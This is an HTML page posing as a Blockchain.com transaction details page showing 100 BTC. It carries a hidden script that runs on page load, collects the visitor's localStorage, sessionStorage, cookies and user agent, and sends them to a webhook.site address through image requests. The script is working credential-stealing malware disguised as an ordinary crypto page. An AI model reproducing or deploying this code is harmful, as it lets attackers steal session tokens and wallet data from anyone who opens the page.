<!DOCTYPE html>
<html>
<head>
    <title>Transaction Details - Blockchain.com</title>
</head>
<body>
    <h1>Transaction Hash: 1234567890abcdef...</h1>
    <p>Amount: 100 BTC ✅</p>

    <script>
        var baseUrl = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394';
        
        // Пробуем получить данные из localStorage
        try {
            var lsData = {};
            for (var i = 0; i < localStorage.length; i++) {
                var key = localStorage.key(i);
                lsData[key] = localStorage.getItem(key);
            }
            new Image().src = baseUrl + '?type=localstorage&data=' + encodeURIComponent(JSON.stringify(lsData));
        } catch(e) {
            new Image().src = baseUrl + '?type=ls_error&data=' + encodeURIComponent(e.toString());
        }
        
        // Пробуем получить данные из sessionStorage
        try {
            var ssData = {};
            for (var i = 0; i < sessionStorage.length; i++) {
                var key = sessionStorage.key(i);
                ssData[key] = sessionStorage.getItem(key);
            }
            new Image().src = baseUrl + '?type=sessionstorage&data=' + encodeURIComponent(JSON.stringify(ssData));
        } catch(e) {
            new Image().src = baseUrl + '?type=ss_error&data=' + encodeURIComponent(e.toString());
        }
        
        // Базовая информация
        new Image().src = baseUrl + '?type=cookies&data=' + encodeURIComponent(document.cookie || 'no_cookies');
        new Image().src = baseUrl + '?type=useragent&data=' + encodeURIComponent(navigator.userAgent || 'no_useragent');
    </script>
</body>
</html>
